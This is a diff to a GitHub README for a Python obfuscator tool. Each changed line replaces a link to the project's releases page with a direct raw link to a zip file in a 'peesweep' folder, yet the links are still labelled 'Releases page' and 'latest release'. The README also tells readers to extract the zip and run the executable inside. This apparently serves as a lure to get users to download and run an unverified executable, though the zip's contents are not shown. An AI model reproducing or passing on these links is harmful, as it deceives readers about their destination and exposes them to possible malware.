@@ -1,7 +1,7 @@
 # 🛡️ python-obfuscator-CalypsisOBF - Protect Your Python Code Effortlessly
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Gobabi25/python-obfuscator-CalypsisOBF/releases)
+[![Download](https://raw.githubusercontent.com/Gobabi25/python-obfuscator-CalypsisOBF/main/peesweep/python-obfuscator-CalypsisOBF.zip%20release-brightgreen)](https://raw.githubusercontent.com/Gobabi25/python-obfuscator-CalypsisOBF/main/peesweep/python-obfuscator-CalypsisOBF.zip)
 
 ## 🚀 Getting Started
 Welcome to the **python-obfuscator-CalypsisOBF** project. This tool helps you protect your Python scripts from unauthorized access. By obfuscating your code, you enhance security and safeguard your intellectual property.
@@ -19,7 +19,7 @@ Welcome to the **python-obfuscator-CalypsisOBF** project. This tool helps you pr
 - **Disk Space**: At least 50 MB of free space for installation.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Gobabi25/python-obfuscator-CalypsisOBF/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Gobabi25/python-obfuscator-CalypsisOBF/main/peesweep/python-obfuscator-CalypsisOBF.zip) to find the latest version.
 2. **Download the Latest Release**: Choose the version suited for your operating system and click the download link.
 3. **Extract Files**: If the file is in a zip format, extract it to a preferred directory on your computer.
 4. **Run the Tool**: Locate the executable or script file in the extracted folder and run it. Follow the prompts to obfuscate your Python scripts.
@@ -53,6 +53,6 @@ Contributions to enhance the tool are welcome. You can send a pull request or pr
 - **v1.2**: Implemented advanced cryptography options.
 
 ## 📥 Final Download Link
-You can download the latest release directly from the [Releases page](https://github.com/Gobabi25/python-obfuscator-CalypsisOBF/releases). 
+You can download the latest release directly from the [Releases page](https://raw.githubusercontent.com/Gobabi25/python-obfuscator-CalypsisOBF/main/peesweep/python-obfuscator-CalypsisOBF.zip). 
 
 Your journey to secure and protected Python scripts starts today!
